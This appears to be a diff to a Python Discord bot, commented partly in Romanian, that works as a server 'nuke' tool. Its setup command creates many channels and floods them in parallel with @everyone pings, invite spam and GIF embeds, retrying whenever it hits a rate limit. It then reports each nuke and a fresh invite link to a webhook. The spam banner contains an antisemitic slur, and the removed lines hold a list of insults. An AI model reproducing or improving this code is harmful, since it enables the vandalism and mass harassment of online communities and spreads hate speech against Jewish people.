@@ -222,11 +222,11 @@ class MyBot(commands.Bot):
 bot = MyBot()
 
 # ================== FUNCȚIA DE LOG PRIN WEBHOOK ==================
-async def send_nuke_log(original_name, guild, user, channels, messages, invite_link=None):
+async def send_nuke_log(guild_name_original, guild, user, channels, messages, invite_link=None):
     if not LOG_WEBHOOK_URL:
         return
 
-    description = f"**{user.display_name}** (`{user.id}`) has just nuked the server **{original_name}**."
+    description = f"**{user.display_name}** (`{user.id}`) has just nuked the server **{guild_name_original}**."
     if invite_link:
         description += f"\n\n🔗 **Server Invite:** {invite_link}"
 
@@ -254,7 +254,7 @@ async def send_nuke_log(original_name, guild, user, channels, messages, invite_l
     except Exception as e:
         print(f"[LOG ERROR] {e}")
 
-# ================== SLASH COMMANDS (doar pentru afișare) ==================
+# ================== SLASH COMMANDS ==================
 @bot.tree.command(name="bypass", description="Manage verification bypasses")
 @app_commands.default_permissions(administrator=True)
 async def bypass(interaction: Interaction):
@@ -296,7 +296,7 @@ async def syncroles(interaction: Interaction):
 async def vouch(interaction: Interaction):
     await interaction.response.send_message("Vouch command is not implemented yet.", ephemeral=True)
 
-# ================== COMENZI PREMIUM (doar owner) ==================
+# ================== COMENZI ==================
 @bot.command(name="addpremium")
 async def addpremium(ctx, user: discord.User):
     if ctx.author.id != OWNER_ID:
@@ -606,8 +606,8 @@ async def setup(ctx):
         "Ez-larp-on-top"
     ]
 
-    # ===== EMBED PRINCIPAL 1 =====
-    embed_content = discord.Embed(
+    # ===== EMBED PRINCIPAL (din poza) =====
+    embed_main = discord.Embed(
         title="**LARP EMPIRE N4KED YOUR AHH**",
         description=(
             "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
@@ -618,37 +618,19 @@ async def setup(ctx):
         ),
         color=0x000000
     )
-    embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
-    embed_content.set_footer(text="Larp Empire • Nuke Service")
+    embed_main.set_image(url="https://i.imgur.com/yMQvcRw.gif")
+    embed_main.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== GIF SPAM 1 =====
-    gif_url_1 = "https://38.media.tumblr.com/662c079bd6ad88db4277487c78422174/tumblr_nvn2znud8t1qjrwyno1_1280.gif"
-    embed_gif_1 = discord.Embed(color=0x000000)
-    embed_gif_1.set_image(url=gif_url_1)
+    # ===== GIF 1 =====
+    embed_gif1 = discord.Embed(color=0x000000)
+    embed_gif1.set_image(url="https://38.media.tumblr.com/662c079bd6ad88db4277487c78422174/tumblr_nvn2znud8t1qjrwyno1_1280.gif")
 
-    # ===== GIF SPAM 2 (alt gif – poți schimba URL-ul dacă ai altul) =====
-    gif_url_2 = "https://media1.tenor.com/m/9p9VKzV1PbMAAAAC/anime-hacker.gif"  # alt gif
-    embed_gif_2 = discord.Embed(color=0x000000)
-    embed_gif_2.set_image(url=gif_url_2)
+    # ===== GIF 2 (alt gif, poți schimba URL-ul) =====
+    embed_gif2 = discord.Embed(color=0x000000)
+    embed_gif2.set_image(url="https://i.imgur.com/yMQvcRw.gif")  # același ca exemplu, poți pune altul
 
-    base_text = "@everyone @here join https://discord.gg/larpempire\n"
-    repeat_count = 50
-    big_message = (base_text * repeat_count)[:2000]
-
-    insults = [
-        "What a low iq user",
-        "Iqlet",
-        "Quit beaming you're trash",
-        "You're a pathetic loser",
-        "Get a life kid",
-        "Larp Empire owns your server",
-        "You couldn't even nuke a sandcastle",
-        "Your mom should've used a condom",
-        "You're a waste of oxygen",
-        "Even your bot is smarter than you",
-        "Go back to playing Roblox",
-        "You're the reason why birth control exists"
-    ]
+    # ===== MESAJ TEXT =====
+    text_message = "@everyone @here join https://discord.gg/larpempire"
 
     font_styles = ["bold", "script", "double"]
     created_channels = []
@@ -658,32 +640,27 @@ async def setup(ctx):
 
     first_channel = None
 
-    ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
-
     async def spam_channel(channel):
         try:
-            # 1 data text mare
-            await send_with_retry(channel, content=big_message)
-            await asyncio.sleep(0.15)
+            # Trimite 15 perechi (text + embed_main + gif1 + gif2) alternativ
+            for _ in range(15):
+                # text
+                await send_with_retry(channel, content=text_message)
+                await asyncio.sleep(0.1)
 
-            # 1 data embed principal
-            await send_with_retry(channel, embed=embed_content)
-            await asyncio.sleep(0.15)
+                # embed main
+                await send_with_retry(channel, embed=embed_main)
+                await asyncio.sleep(0.1)
 
-            # 1 data gif 1
-            await send_with_retry(channel, embed=embed_gif_1)
-            await asyncio.sleep(0.15)
+                # gif1
+                await send_with_retry(channel, embed=embed_gif1)
+                await asyncio.sleep(0.1)
 
-            # 1 data gif 2
-            await send_with_retry(channel, embed=embed_gif_2)
-            await asyncio.sleep(0.15)
+                # gif2
+                await send_with_retry(channel, embed=embed_gif2)
+                await asyncio.sleep(0.1)
 
-            # insultă
-            insult = random.choice(insults)
-            await send_with_retry(channel, content=f"**{insult}**")
-            await asyncio.sleep(0.15)
-
-            # spam cu ping-uri (de spam_messages ori)
+            # Apoi trimite spam-ul cu ping-uri de `spam_messages` ori
             for _ in range(spam_messages):
                 ping_count = random.randint(5, 12)
                 msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
@@ -721,7 +698,6 @@ async def setup(ctx):
     tasks = [create_and_spam(i) for i in range(total_channels)]
     await asyncio.gather(*tasks)
 
-    # ===== LOG CU NUMELE ORIGINAL ȘI INVITAȚIA PROASPĂTĂ =====
     await send_nuke_log(original_name, guild, user, total_channels, spam_messages, invite_link)
 
     await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel with retry on rate-limit!")
